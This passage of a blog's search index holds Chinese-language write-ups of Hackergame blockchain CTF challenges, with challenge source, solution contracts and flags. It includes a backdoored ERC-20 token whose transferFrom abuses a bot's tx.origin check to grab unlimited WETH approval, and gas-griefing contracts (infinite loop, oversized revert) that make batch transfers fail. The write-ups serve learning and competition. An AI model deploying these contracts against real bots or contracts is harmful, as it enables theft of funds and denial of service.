( this )); } }","title":"Exploitation"},{"location":"blockchain/hackergame/chain_hunter/#flag_1","text":"flag{S1MUl4t1oN_d0esnt_Gu4r4ntee_EXEcution_c0rr3ctne5555f5b9c201}","title":"Flag"},{"location":"blockchain/hackergame/chain_hunter/#deaths-end_1","text":"\u672c\u5c0f\u9898\u7684 arbitrage() \u80fd\u591f\u4fdd\u8bc1\u5957\u5229\u7ed3\u675f\u540e\u5408\u7ea6\u6301\u6709 WETH \u589e\u52a0\uff0c\u5176\u51fd\u6570\u529f\u80fd\u76f8\u5f53\u4e8e multicall() 1 2 3 4 5 6 7 8 9 10 function arbitrage ( address [] calldata addressList , bytes [] calldata calldataList ) external { require ( msg . sender == owner , \"sender\" ); uint balanceBefore = WETH . balanceOf ( address ( this )); require ( addressList . length == calldataList . length ); for ( uint i = 0 ; i < addressList . length ; i ++ ) { ( bool success , ) = addressList [ i ]. call ( calldataList [ i ]); require ( success ); } require ( WETH . balanceOf ( address ( this )) > balanceBefore , \"balance\" ); } uniswapV2Call() \u540c\u6837\u4fee\u6539\u4e3a\u4e86 multicall() \u7684\u5f62\u5f0f\uff0c\u4f46\u4ecd\u7136\u662f\u5bf9 tx.origin \u8fdb\u884c\u9a8c\u8bc1 1 2 3 4 5 6 7 8 9 function uniswapV2Call ( address , uint , uint , bytes calldata data ) external { require ( tx . origin == owner , \"origin\" ); ( address [] memory addressList , bytes [] memory calldataList ) = abi . decode ( data , ( address [], bytes [])); require ( addressList . length == calldataList . length ); for ( uint i = 0 ; i < addressList . length ; i ++ ) { ( bool success , ) = addressList [ i ]. call ( calldataList [ i ]); require ( success ); } } \u4e0e The Dark Forest \u7684\u601d\u8def\u7c7b\u4f3c\uff0c\u53ef\u4ee5\u5728\u5957\u5229\u4ea4\u6613\u4e2d\u8c03\u7528 uniswapV2Call() \u6765\u6388\u4e88\u5176\u5b83\u8d26\u6237 WETH \u7684\u4f7f\u7528\u6743\uff0c\u518d\u5728\u5957\u5229\u7ed3\u675f\u540e\u53d6\u51fa MEV bot \u4e2d\u7684\u8d44\u91d1","title":"Death's End"},{"location":"blockchain/hackergame/chain_hunter/#exploitation_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 contract HackToken { string public constant name = \"Hack Token\" ; string public constant symbol = \"HT\" ; uint8 public constant decimals = 18 ; uint public totalSupply = 1 ether ; IUniswapV2Callee bot ; address weth ; address owner ; bool hacked ; event Approval ( address indexed src , address indexed guy , uint wad ); event Transfer ( address indexed src , address indexed dst , uint wad ); mapping ( address => uint ) public balanceOf ; mapping ( address => mapping ( address => uint )) public allowance ; constructor ( IUniswapV2Callee _bot , address _weth ) { balanceOf [ msg . sender ] = totalSupply ; weth = _weth ; bot = _bot ; owner = tx . origin ; } function approve ( address guy , uint wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } function transfer ( address dst , uint wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) public returns ( bool ) { backdoor (); require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function backdoor () internal { if ( ! hacked && tx . origin != owner ) { address [] memory addressList = new address []( 1 ); bytes [] memory calldataList = new bytes []( 1 ); addressList [ 0 ] = weth ; calldataList [ 0 ] = abi . encodeWithSignature ( \"approve(address,uint256)\" , owner , type ( uint ). max ); bytes memory data = abi . encode ( addressList , calldataList ); bot . uniswapV2Call ( address ( 0 ), 0 , 0 , data ); hacked = true ; } } function swap ( uint , uint , address , bytes calldata ) external {} } contract Hack { function exploit ( IUniswapV2Factory factory1 , IUniswapV2Factory factory2 , IWETH weth , IUniswapV2Callee bot ) external payable { HackToken token = new HackToken ( bot , address ( weth )); address pair1 = factory1 . createPair ( address ( weth ), address ( token )); address pair2 = factory2 . createPair ( address ( weth ), address ( token )); weth . deposit { value : msg . value }(); require ( weth . transfer ( pair1 , 0.1 ether )); require ( token . transfer ( pair1 , 0.1 ether )); IUniswapV2Pair ( pair1 ). mint ( address ( this )); require ( weth . transfer ( pair2 , 0.1 ether )); require ( token . transfer ( pair2 , 0.2 ether )); IUniswapV2Pair ( pair2 ). mint ( address ( this )); } }","title":"Exploitation"},{"location":"blockchain/hackergame/chain_hunter/#flag_2","text":"flag{RuN_Ur_0wn_B0T_4_FuN_&_Pr0f1t:)b7e0a89554}","title":"Flag"},{"location":"blockchain/hackergame/chain_transfer_helper/","tags":["smart contract","gas griefing","returnbomb attack"],"text":"#smart contract #gas griefing #returnbomb attack .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 main.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 from web3 import Web3 from web3.middleware import geth_poa_middleware import os import json import time challenge_id = int ( input ( 'The challenge you want to play (1 or 2 or 3): ' )) assert challenge_id == 1 or challenge_id == 2 or challenge_id == 3 player_bytecode = bytes . fromhex ( input ( 'Player bytecode: ' )) print ( 'Launching anvil...' ) os . system ( 'anvil --silent --disable-console-log --ipc /dev/shm/eth.ipc &' ) time . sleep ( 2 ) w3 = Web3 ( Web3 . IPCProvider ( '/dev/shm/eth.ipc' )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) privatekey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' # anvil default private key acct = w3 . eth . account . from_key ( privatekey ) print ( 'Deploying challenge contract...' ) bytecode , abi = json . load ( open ( f 'contract { challenge_id } .json' )) Challenge = w3 . eth . contract ( abi = abi , bytecode = bytecode ) nonce = w3 . eth . get_transaction_count ( acct . address ) tx = Challenge . constructor () . build_transaction ({ 'nonce' : nonce , 'from' : acct . address }) signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) assert tx_receipt . status print ( 'Challenge contract address:' , tx_receipt . contractAddress ) challenge = w3 . eth . contract ( address = tx_receipt . contractAddress , abi = abi ) print ( 'Deploying player contract...' ) recipients = [] for i in range ( 10 ): nonce = w3 . eth . get_transaction_count ( acct . address ) tx = { 'to' : None , 'data' : player_bytecode , 'nonce' : nonce , 'from' : acct . address , 'gasPrice' : w3 . eth . gas_price , 'gas' : 1000000 } signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) if not tx_receipt . status : print ( 'Failed deploying player contract' ) exit ( - 1 ) recipients . append ( tx_receipt . contractAddress ) amounts = [ w3 . to_wei ( 1 , 'ether' )] * 10 nonce = w3 . eth . get_transaction_count ( acct . address ) tx = challenge . functions . batchTransfer ( recipients , amounts ) . build_transaction ({ 'nonce' : nonce , 'from' : acct . address , 'value' : sum ( amounts ), 'gas' : 1000000 }) signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) if tx_receipt . status : print ( 'Transfer success, no flag.' ) exit ( - 1 ) print ( open ( f 'flag { challenge_id } ' ) . read ()) challenge1.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { recipients [ i ]. transfer ( amounts [ i ]); } } } challenge2.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { mapping ( address => uint256 ) public pendingWithdrawals ; function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { ( bool success , ) = recipients [ i ]. call { value : amounts [ i ]}( \"\" ); if ( ! success ) { pendingWithdrawals [ recipients [ i ]] += amounts [ i ]; } } } function withdrawPending () external { uint256 amount = pendingWithdrawals [ msg . sender ]; pendingWithdrawals [ msg . sender ] = 0 ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); require ( success , \"Withdrawal failed\" ); } } challenge3.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { mapping ( address => uint256 ) public pendingWithdrawals ; function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { ( bool success , ) = recipients [ i ]. call { value : amounts [ i ], gas : 10000 }( \"\" ); if ( ! success ) { pendingWithdrawals [ recipients [ i ]] += amounts [ i ]; } } } function withdrawPending () external { uint256 amount = pendingWithdrawals [ msg . sender ]; pendingWithdrawals [ msg . sender ] = 0 ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); require ( success , \"Withdrawal failed\" ); } } \u89e3\u9898\u601d\u8def \u00b6 \u6bcf\u9898\u4f1a\u6839\u636e\u73a9\u5bb6\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u90e8\u7f72\u5341\u4e2a\u5408\u7ea6\u5e76\u4f5c\u4e3a BatchTransfer::batchTransfer() \u7684\u63a5\u6536\u8005\uff0c\u968f\u540e\u6267\u884c\u8f6c\u8d26\u4ea4\u6613 \u82e5\u8c03\u7528 batchTransfer() \u51fd\u6570\u7684\u4ea4\u6613\u6267\u884c\u5931\u8d25\u5373\u53ef\u83b7\u5f97 Flag Challenge 1 \u00b6 \u672c\u9898\u4f7f\u7528 transfer \u8fdb\u884c\u8f6c\u8d26\uff0c\u8f6c\u8d26\u5931\u8d25\u4f1a\u62a5\u9519\u5bfc\u81f4\u4ea4\u6613\u56de\u6eda \u4e00\u4e2a\u6ca1\u6709 receive() \u6216 fallback() \u51fd\u6570\u7684\u5408\u7ea6\u5373\u53ef :3 1 contract Empty {} Flag \u00b6 flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt} Challenge 2 \u00b6 \u672c\u9898\u5c06 transfer() \u6539\u4e3a call() \uff0c\u5982\u679c\u8f6c\u8d26\u5931\u8d25\u5219\u5c06\u91d1\u989d\u8bb0\u5f55\u5230 pendingWithdrawals \u6620\u5c04\u4e2d \u6839\u636e Challenge 3 \u7684\u4fee\u6539\u5bb9\u6613\u60f3\u5230\u53ef\u4ee5\u901a\u8fc7\u6b7b\u5faa\u73af\u8017\u5c3d\u4ea4\u6613\u7684 gas 1 2 3 4 5 contract Loop { receive () external payable { while ( true ) {} } } Flag \u00b6 flag{Ple4se_L1m1t_y0uR_GAS_HaHa} Challenge 3 \u00b6 \u672c\u9898\u9650\u5236\u4e86\u6bcf\u6b21 call() \u7684 gas \u6d88\u8017\u4e3a 1 \u4e07\uff0c\u800c batchTransfer() \u4ea4\u6613\u7684 gas limit \u4e3a 100 \u4e07 \u9700\u8981\u8ba9\u5185\u90e8\u4ea4\u6613\u5c3d\u53ef\u80fd\u5730\u5f71\u54cd\u4e3b\u4ea4\u6613\uff0c\u4e00\u4e2a\u65b9\u5f0f\u662f\u8fd4\u56de\u5927\u91cf\u5b57\u8282 Solidity \u7684\u4f4e\u7ea7\u8c03\u7528\u4f1a\u5c06\u8fd4\u56de\u7684\u6240\u6709\u6570\u636e\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d\uff0c\u800c\u5185\u5b58\u6269\u5bb9\uff08\u4ee5\u5b57\u4e3a\u5355\u4f4d\uff09\u4f1a\u589e\u52a0 gas \u6d88\u8017 mem_size_words = (mem_size + 31) // 32 gas_cost = (mem_size_words ^ 2 // 512) + (3 * mem_size_words) - C men (old_state) \u4f7f\u7528 revert \u8fd4\u56de\u6570\u636e\u80fd\u591f\u901a\u8fc7\u8bfb\u5199\u72b6\u6001\u53d8\u91cf\u6d88\u8017\u66f4\u591a\u7684 gas\uff0c\u4e0d\u8fc7\u672c\u9898 return \u5c31\u8db3\u591f\u4e86 1 2 3 4 5 6 7 contract HugeReturn { receive () external payable { assembly { revert ( 0 , 55000 ) } } } Flag \u00b6 flag{Y0u_4re_Th3_M4sTeR_0f_EVM!!!} \u53c2\u8003\u8d44\u6599 \u00b6 Appendix - Dynamic Gas Costs nomad-xyz / ExcessivelySafeCall","title":"\u94fe\u4e0a\u8f6c\u8d26\u52a9\u624b"},{"location":"blockchain/hackergame/chain_transfer_helper/#_1","text":"main.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 from web3 import Web3 from web3.middleware import geth_poa_middleware import os import json import time challenge_id = int ( input ( 'The challenge you want to play (1 or 2 or 3): ' )) assert challenge_id == 1 or challenge_id == 2 or challenge_id == 3 player_bytecode = bytes . fromhex ( input ( 'Player bytecode: ' )) print ( 'Launching anvil...' ) os . system ( 'anvil --silent --disable-console-log --ipc /dev/shm/eth.ipc &' ) time . sleep ( 2 ) w3 = Web3 ( Web3 . IPCProvider ( '/dev/shm/eth.ipc' )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) privatekey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' # anvil default private key acct = w3 . eth . account . from_key ( privatekey ) print ( 'Deploying challenge contract...' ) bytecode , abi = json . load ( open ( f 'contract { challenge_id } .json' )) Challenge = w3 . eth . contract ( abi = abi , bytecode = bytecode ) nonce = w3 . eth . get_transaction_count ( acct . address ) tx = Challenge . constructor () . build_transaction ({ 'nonce' : nonce , 'from' : acct . address }) signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) assert tx_receipt . status print ( 'Challenge contract address:' , tx_receipt . contractAddress ) challenge = w3 . eth . contract ( address = tx_receipt . contractAddress , abi = abi ) print ( 'Deploying player contract...' ) recipients = [] for i in range ( 10 ): nonce = w3 . eth . get_transaction_count ( acct . address ) tx = { 'to' : None , 'data' : player_bytecode , 'nonce' : nonce , 'from' : acct . address , 'gasPrice' : w3 . eth . gas_price , 'gas' : 1000000 } signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) if not tx_receipt . status : print ( 'Failed deploying player contract' ) exit ( - 1 ) recipients . append ( tx_receipt . contractAddress ) amounts = [ w3 . to_wei ( 1 , 'ether' )] * 10 nonce = w3 . eth . get_transaction_count ( acct . address ) tx = challenge . functions . batchTransfer ( recipients , amounts ) . build_transaction ({ 'nonce' : nonce , 'from' : acct . address , 'value' : sum ( amounts ), 'gas' : 1000000 }) signed_tx = w3 . eth . account . sign_transaction ( tx , private_key = privatekey ) tx_hash = w3 . eth . send_raw_transaction ( signed_tx . rawTransaction ) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) if tx_receipt . status : print ( 'Transfer success, no flag.' ) exit ( - 1 ) print ( open ( f 'flag { challenge_id } ' ) . read ()) challenge1.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { recipients [ i ]. transfer ( amounts [ i ]); } } } challenge2.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { mapping ( address => uint256 ) public pendingWithdrawals ; function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { ( bool success , ) = recipients [ i ]. call { value : amounts [ i ]}( \"\" ); if ( ! success ) { pendingWithdrawals [ recipients [ i ]] += amounts [ i ]; } } } function withdrawPending () external { uint256 amount = pendingWithdrawals [ msg . sender ]; pendingWithdrawals [ msg . sender ] = 0 ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); require ( success , \"Withdrawal failed\" ); } } challenge3.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract BatchTransfer { mapping ( address => uint256 ) public pendingWithdrawals ; function batchTransfer ( address payable [] calldata recipients , uint256 [] calldata amounts ) external payable { require ( recipients . length == amounts . length , \"Recipients and amounts length mismatch\" ); uint256 totalAmount = 0 ; uint256 i ; for ( i = 0 ; i < amounts . length ; i ++ ) { totalAmount += amounts [ i ]; } require ( totalAmount == msg . value , \"Incorrect total amount\" ); for ( i = 0 ; i < recipients . length ; i ++ ) { ( bool success , ) = recipients [ i ]. call { value : amounts [ i ], gas : 10000 }( \"\" ); if ( ! success ) { pendingWithdrawals [ recipients [ i ]] += amounts [ i ]; } } } function withdrawPending () external { uint256 amount = pendingWithdrawals [ msg . sender ]; pendingWithdrawals [ msg . sender ] = 0 ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); require ( success , \"Withdrawal failed\" ); } }","title":"\u9898\u76ee"},{"location":"blockchain/hackergame/chain_transfer_helper/#_2","text":"\u6bcf\u9898\u4f1a\u6839\u636e\u73a9\u5bb6\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u90e8\u7f72\u5341\u4e2a\u5408\u7ea6\u5e76\u4f5c\u4e3a BatchTransfer::batchTransfer() \u7684\u63a5\u6536\u8005\uff0c\u968f\u540e\u6267\u884c\u8f6c\u8d26\u4ea4\u6613 \u82e5\u8c03\u7528 batchTransfer() \u51fd\u6570\u7684\u4ea4\u6613\u6267\u884c\u5931\u8d25\u5373\u53ef\u83b7\u5f97 Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/hackergame/chain_transfer_helper/#challenge-1","text":"\u672c\u9898\u4f7f\u7528 transfer \u8fdb\u884c\u8f6c\u8d26\uff0c\u8f6c\u8d26\u5931\u8d25\u4f1a\u62a5\u9519\u5bfc\u81f4\u4ea4\u6613\u56de\u6eda \u4e00\u4e2a\u6ca1\u6709 receive() \u6216 fallback() \u51fd\u6570\u7684\u5408\u7ea6\u5373\u53ef :3 1 contract Empty {}","title":"Challenge 1"},{"location":"blockchain/hackergame/chain_transfer_helper/#flag","text":"flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt}","title":"Flag"},{"location":"blockchain/hackergame/chain_transfer_helper/#challenge-2","text":"\u672c\u9898\u5c06 transfer() \u6539\u4e3a call() \uff0c\u5982\u679c\u8f6c\u8d26\u5931\u8d25\u5219\u5c06\u91d1\u989d\u8bb0\u5f55\u5230 pendingWithdrawals \u6620\u5c04\u4e2d \u6839\u636e Challenge 3 \u7684\u4fee\u6539\u5bb9\u6613\u60f3\u5230\u53ef\u4ee5\u901a\u8fc7\u6b7b\u5faa\u73af\u8017\u5c3d\u4ea4\u6613\u7684 gas 1 2 3 4 5 contract Loop { receive () external payable { while ( true ) {} } }","title":"Challenge 2"},{"location":"blockchain/hackergame/chain_transfer_helper/#flag_1","text":"flag{Ple4se_L1m1t_y0uR_GAS_HaHa}","title":"Flag"},{"location":"blockchain/hackergame/chain_transfer_helper/#challenge-3","text":"\u672c\u9898\u9650\u5236\u4e86\u6bcf\u6b21 call() \u7684 gas \u6d88\u8017\u4e3a 1 \u4e07\uff0c\u800c batchTransfer() \u4ea4\u6613\u7684 gas limit \u4e3a 100 \u4e07 \u9700\u8981\u8ba9\u5185\u90e8\u4ea4\u6613\u5c3d\u53ef\u80fd\u5730\u5f71\u54cd\u4e3b\u4ea4\u6613\uff0c\u4e00\u4e2a\u65b9\u5f0f\u662f\u8fd4\u56de\u5927\u91cf\u5b57\u8282 Solidity \u7684\u4f4e\u7ea7\u8c03\u7528\u4f1a\u5c06\u8fd4\u56de\u7684\u6240\u6709\u6570\u636e\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d\uff0c\u800c\u5185\u5b58\u6269\u5bb9\uff08\u4ee5\u5b57\u4e3a\u5355\u4f4d\uff09\u4f1a\u589e\u52a0 gas \u6d88\u8017 mem_size_words = (mem_size + 31) // 32 gas_cost = (mem_size_words ^ 2 // 512) + (3 * mem_size_words) - C men (old_state) \u4f7f\u7528 revert \u8fd4\u56de\u6570\u636e\u80fd\u591f\u901a\u8fc7\u8bfb\u5199\u72b6\u6001\u53d8\u91cf\u6d88\u8017\u66f4\u591a\u7684 gas\uff0c\u4e0d\u8fc7\u672c\u9898 return \u5c31\u8db3\u591f\u4e86 1 2 3 4 5 6 7 contract HugeReturn { receive () external payable { assembly { revert ( 0 , 55000 ) } } }","title":"Challenge 3"},{"location":"blockchain/hackergame/chain_transfer_helper/#flag_2","text":"flag{Y0u_4re_Th3_M4sTeR_0f_EVM!!!}","title":"Flag"},{"location":"blockchain/hackergame/chain_transfer_helper/#_3","text":"Appendix - Dynamic Gas Costs nomad-xyz / ExcessivelySafeCall","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/hackergame/memory_master_on_the_chain/","tags":["smart contract"],"text":"#smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 \u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002 main.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 from web3 import Web3 from web3.middleware import geth_poa_middleware import os import json import time import shutil challenge_id = int ( input ( 'The challenge you want to play (1 or 2 or 3): ' )) assert challenge_id == 1 or challenge_id == 2 or challenge_id == 3 player_bytecode = bytes . fromhex ( input ( 'Player bytecode: ' )) print ( 'Launching geth...' ) shutil . copytree ( '/data' , '/dev/shm/geth' ) os . system ( 'geth --datadir /dev/shm/geth --nodiscover --mine --unlock 0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6 --password password.txt --verbosity 0 --datadir.minfreedisk 0 &' ) time . sleep ( 2 ) w3 = Web3 ( Web3 . IPCProvider ( '/dev/shm/geth/geth.ipc' )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) w3 . eth . default_account = w3 . eth . accounts [ 0 ] w3 . geth . personal . unlock_account ( w3 . eth . default_account , open ( 'password.txt' ) . read () . strip ()) print ( 'Deploying challenge contract...' ) bytecode , abi = json . load ( open ( f 'contract { challenge_id } .json' )) Challenge = w3 . eth . contract ( abi = abi , bytecode = bytecode ) tx_hash = Challenge . constructor () . transact () tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( 'Challenge contract address:' , tx_receipt . contractAddress ) challenge = w3 . eth . contract ( address = tx_receipt . contractAddress , abi = abi ) print ( 'Deploying player contract...' ) tx_hash = w3 . eth . send_transaction ({ 'to' : None , 'data' : player_bytecode }) tx_receipt = w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( 'Player contract address:' , tx_receipt . contractAddress ) for i in range ( 10 ): print ( f 'Testing { i + 1 } /10...' ) if challenge_id == 2 : n = int . from_bytes ( os . urandom ( 2 ), 'big' ) else : n = int . from_bytes ( os . urandom ( 32 ), 'big' ) print ( f 'n = { n } ' ) if challenge . functions . test ( tx_receipt . contractAddress , n ) . call (): print ( 'Test passed!' ) else : print ( 'Test failed!' ) exit ( - 1 ) print ( open ( f 'flag { challenge_id } ' ) . read ()) compile.py 1 2 3 4 5 6 7 8 9 from solcx import compile_source import json for i in 1 , 2 , 3 : compiled_sol = compile_source ( open ( f 'challenge { i } .sol' ) . read (), output_values = [ 'abi' , 'bin' ]) contract_interface = compiled_sol [ '<stdin>:Challenge' ] bytecode = contract_interface [ 'bin' ] abi = contract_interface [ 'abi' ] json . dump (( bytecode , abi ), open ( f 'contract { i } .json' , 'w' )) genesis.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 { \"config\" : { \"chainId\" : 2022 , \"homesteadBlock\" : 0 , \"eip150Block\" : 0 , \"eip155Block\" : 0 , \"eip158Block\" : 0 , \"byzantiumBlock\" : 0 , \"constantinopleBlock\" : 0 , \"petersburgBlock\" : 0 , \"istanbulBlock\" : 0 , \"muirGlacierBlock\" : 0 , \"berlinBlock\" : 0 , \"londonBlock\" : 0 , \"arrowGlacierBlock\" : 0 , \"grayGlacierBlock\" : 0 , \"clique\" : { \"period\" : 0 , \"epoch\" : 30000 } }, \"alloc\" : { \"0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6\" : { \"balance\" : \"0x56bc75e2d63100000\" } }, \"coinbase\" : \"0x0000000000000000000000000000000000000000\" , \"difficulty\" : \"0x1\" , \"gasLimit\" : \"0x1c9c380\" , \"extraData\" : \"0x00000000000000000000000000000000000000000000000000000000000000002022af4dcbb9da7f41cbd3dd8cdb4134d4e6dde60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\" , \"nonce\" : \"0x0000000000000042\" , \"mixhash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"timestamp\" : \"0x00\" } Dockerfile 1 2 3 4 5 6 7 8 9 FROM ubuntu:22.04 RUN apt update && apt install -y software-properties-common && add-apt-repository -y ppa:ethereum/ethereum && apt update && apt install -y ethereum python3-pip RUN python3 -m pip install web3 py-solc-x RUN python3 -c \"from solcx import install_solc; install_solc(version='latest')\" COPY genesis.json privatekey.txt password.txt main.py challenge1.sol challenge2.sol challenge3.sol compile.py / RUN geth init --datadir data genesis.json RUN geth --datadir data account import --password password.txt privatekey.txt RUN python3 compile.py CMD [ \"/usr/bin/python3\" , \"-u\" , \"/main.py\" ] \u8bb0\u5fc6\u7ec3\u4e60 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } } \u725b\u5200\u5c0f\u8bd5 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint16 n ) external ; function recall () external view returns ( uint16 ); } contract Challenge { function test ( MemoryMaster m , uint16 n ) external returns ( bool 